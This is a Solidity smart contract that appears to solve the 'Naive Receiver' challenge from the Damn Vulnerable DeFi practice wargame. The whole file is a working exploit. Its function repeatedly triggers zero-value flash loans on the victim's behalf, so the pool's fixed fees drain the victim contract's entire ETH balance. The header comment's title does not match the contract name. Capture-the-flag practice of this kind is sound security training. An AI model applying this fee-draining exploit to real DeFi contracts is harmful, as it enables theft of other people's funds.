// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./NaiveReceiverLenderPool.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract NaiveKiller {

    NaiveReceiverLenderPool private naiveReceiver;
    address payable private victim;

    constructor(address payable poolAddress, address payable victimAddress) {
        naiveReceiver = NaiveReceiverLenderPool(poolAddress);
        victim = victimAddress;
    }

    // Function called by the pool during flash loan
    function killTheDev() public payable {
        while(address(victim).balance > 0) {
            naiveReceiver.flashLoan(victim, 0); 
        }
        
    }

    // Allow deposits of ETH
    receive () external payable {}
}